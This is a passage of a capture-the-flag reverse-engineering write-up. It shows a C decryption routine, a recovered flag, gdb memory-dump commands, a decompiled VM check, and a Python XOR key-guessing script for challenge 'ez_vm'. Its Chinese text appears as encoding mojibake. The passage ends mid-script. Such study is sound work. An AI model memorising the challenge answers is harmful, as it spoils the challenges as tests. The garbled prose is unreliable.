</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// æ‰§è¡Œè§£å¯†
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">decrypt_32_rounds</span><span class="p">(</span><span class="n">first_bytes</span><span class="p">,</span> <span class="n">second_bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// å°†è§£å¯†ç»“æœè½¬æ¢å›æ•´æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">decrypted_first</span> <span class="o">=</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">first_bytes</span><span class="p">);</span>   <span class="c1">// è§£å¯†åçš„å‰å››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">decrypted_second</span> <span class="o">=</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">second_bytes</span><span class="p">);</span> <span class="c1">// è§£å¯†åçš„åå››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;è§£å¯†å: å‰å››ä¸ªå­—èŠ‚=0x%08X, åå››ä¸ªå­—èŠ‚=0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">decrypted_first</span><span class="p">,</span> <span class="n">decrypted_second</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// è½¬æ¢ä¸ºASCIIå­—ç¬¦ä¸²
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint8_t</span> <span class="n">all_bytes</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">decrypted_first</span><span class="p">,</span> <span class="n">all_bytes</span><span class="p">);</span>    <span class="c1">// å‰å››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">decrypted_second</span><span class="p">,</span> <span class="n">all_bytes</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span> <span class="c1">// åå››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;å®Œæ•´æ˜æ–‡: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">all_bytes</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="n">all_bytes</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">all_bytes</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">x%02X&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">all_bytes</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå®Œä¹‹åflagè¢«æ‹†æˆå››å—ï¼Œæ‹¼æ¥ä¸€ä¸‹å¯å¾—syc{QYQS_F1nD_Th3_@nswer_H3re~~}</p>
<h3 id="11ez_vm">11.ez_vm
</h3><p>è¿™é¢˜å¯ä»¥é»‘ç›’</p>
<p>å…ˆåŠ¨è°ƒå‡ºå¯†æ–‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x/gx 0x55555555a2a0 + 96
</span></span><span class="line"><span class="cl"># æ›¿æ¢ base_ptr ä¸ºå®é™…å€¼ï¼Œä¾‹å¦‚ base_ptr=0x000055555555b000ï¼Œåˆ™å‘½ä»¤ä¸ºï¼š
</span></span><span class="line"><span class="cl">x/29bx 0x000055555555b000 + 256
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0x09, 0x03, 0x19, 0x21, 0x0d, 0x69, 0x6b, 0x39,
</span></span><span class="line"><span class="cl">0x6a, 0x37, 0x69, 0x05, 0x2e, 0x6a, 0x05, 0x28,
</span></span><span class="line"><span class="cl">0x69, 0x1a, 0x6b, 0x05, 0x28, 0x69, 0x2c, 0x3f,
</span></span><span class="line"><span class="cl">0x28, 0x29, 0x3f, 0x7b, 0x27
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åçœ‹ç¨‹åº</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_9e8f7a</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-78h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-70h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please enter the input string: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">s</span><span class="p">[</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span> <span class="o">+</span> <span class="mi">768LL</span><span class="p">),</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span> <span class="o">+</span> <span class="mi">256LL</span><span class="p">),</span> <span class="mh">0x1DuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span> <span class="o">+</span> <span class="mi">512LL</span><span class="p">),</span> <span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">dword_50AC</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">dword_50CC</span> <span class="o">=</span> <span class="mi">768</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">dword_5134</span> <span class="o">=</span> <span class="mi">768</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">vm_load_program</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">xor_compare_program</span><span class="p">,</span> <span class="mi">37LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">vm_run</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Success: Input matches processed string!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Failure: Input does not match.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶ä¸­æœ‰å¼‚æˆ–çš„å­—çœ¼</p>
<p>å¯ä»¥å…ˆè¯•è¯•é»‘ç›’ï¼Œå·²çŸ¥flagçš„å‰å››ä½æ˜¯SYC{</p>
<p>å·²çŸ¥äº†å¯†æ–‡ï¼Œé»‘ç›’è§£å¯†å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å·²çŸ¥åŸºç¡€æ•°æ®</span>
</span></span><span class="line"><span class="cl"><span class="n">target_data</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_prefix</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;SYC{&#34;</span>  <span class="c1"># å‰4å­—èŠ‚æ˜æ–‡ï¼šS(0x53)ã€Y(0x59)ã€C(0x43)ã€{(0x7B)</span>
</span></span><span class="line"><span class="cl"><span class="n">valid_candidates</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># å­˜å‚¨æ‰€æœ‰åˆç†çš„è§£å¯†ç»“æœ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 1. ç±»å‹1ï¼š2å­—èŠ‚å›ºå®šå¯†é’¥å¼‚æˆ–ï¼ˆå¾ªç¯ä½¿ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack_2byte_xor</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å‰4å­—èŠ‚æ˜æ–‡ï¼šp0=0x53, p1=0x59, p2=0x43, p3=0x7B</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å¯†é’¥å¾ªç¯ï¼šk0, k1, k0, k1 â†’ æ¨å¯¼k0å’Œk1</span>
</span></span><span class="line"><span class="cl">    <span class="n">p0</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span> <span class="o">=</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x7B</span>
</span></span><span class="line"><span class="cl">    <span class="n">t0</span><span class="p">,</span> <span class="n">t1</span><span class="p">,</span> <span class="n">t2</span><span class="p">,</span> <span class="n">t3</span> <span class="o">=</span> <span class="n">target_data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">target_data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">target_data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">target_data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># æ¨å¯¼å¯†é’¥ï¼šk0 = p0 ^ t0 = p2 ^ t2ï¼›k1 = p1 ^ t1 = p3 ^ t3</span>
</span></span><span class="line"><span class="cl">    <span class="n">k0_candidate</span> <span class="o">=</span> <span class="n">p0</span> <span class="o">^</span> <span class="n">t0</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">p2</span> <span class="o">^</span> <span class="n">t2</span><span class="p">)</span> <span class="o">!=</span> <span class="n">k0_candidate</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>  <span class="c1"># æ— ç¬¦åˆæ¡ä»¶çš„2å­—èŠ‚å¯†é’¥</span>
</span></span><span class="line"><span class="cl">    <span class="n">k1_candidate</span> <span class="o">=</span> <span class="n">p1</span> <span class="o">^</span> <span class="n">t1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">p3</span> <span class="o">^</span> <span class="n">t3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">k1_candidate</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># éªŒè¯å®Œæ•´è§£å¯†ç»“æœ</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="n">k0_candidate</span><span class="p">,</span> <span class="n">k1_candidate</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypt_result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">target_data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_byte</span> <span class="o">=</span> <span class="n">target_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypt_byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypt_str</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypt_result</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># è¿‡æ»¤ï¼šå«flagå¸¸è§å­—ç¬¦ï¼Œä¸”ä»¥SYC{å¼€å¤´ã€å«}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">decrypt_str</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;SYC{&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">decrypt_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">valid_candidates</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;2å­—èŠ‚å¯†é’¥å¼‚æˆ–ï¼ˆkey=</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">k0_candidate</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">k1_candidate</span><span class="p">)</span><span class="si">}</span><span class="s2">ï¼‰: </span><span class="si">{</span><span class="n">decrypt_str</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 2. ç±»å‹2ï¼š4å­—èŠ‚å›ºå®šå¯†é’¥å¼‚æˆ–ï¼ˆå¾ªç¯ä½¿ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack_4byte_xor</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å‰4å­—èŠ‚æ˜æ–‡p0-p3ï¼Œå¯¹åº”å¯†æ–‡t0-t3 â†’ å¯†é’¥k0=p0^t0, k1=p1^t1, k2=p2^t2, k3=p3^t3</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="n">flag_prefix</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">target_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è§£å¯†å®Œæ•´æ•°æ®ï¼ˆå¯†é’¥å¾ªç¯ä½¿ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypt_result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">target_data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_byte</span> <span class="o">=</span> <span class="n">target_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypt_result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypt_byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypt_str</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypt_result</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">decrypt_str</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;SYC{&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">decrypt_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">valid_candidates</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;4å­—èŠ‚å¯†é’¥å¼‚æˆ–ï¼ˆkey=</span><span class="si">{</span><span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">key</span><span class="p">]</span><span class="si">}</span><span class="s2">ï¼‰: </span><span class="si">{</span><span class="n">decrypt_str</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 3. ç±»å‹3ï¼šå›ºå®šåç§»å¼‚æˆ–ï¼ˆkey = base + iï¼Œiä¸ºå­—èŠ‚ä½ç½®0-28ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack_offset_xor</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å‰4å­—èŠ‚æ¨å¯¼baseï¼šp0 = t0 ^ (base+0) â†’ base = p0 ^ t0ï¼›éªŒè¯åç»­æ˜¯å¦åŒ¹é…</span>
</span></span><span class="line"><span class="cl">    <span class="n">base_candidate</span> <span class="o">=</span> <span class="n">flag_prefix</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">target_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># éªŒè¯å‰4å­—èŠ‚æ˜¯å¦ç¬¦åˆï¼šp[i] == t[i] ^ (base + i)</span>
</span></span><span class="line"><span class="cl">    <span class="n">valid_base</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">flag_prefix</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="p">(</span><span class="n">target_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">base_candidate</span> <span class="o">+</span> <span class="n">i</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">valid_base</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">valid_base</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è§£å¯†å®Œæ•´æ•°æ®</span>
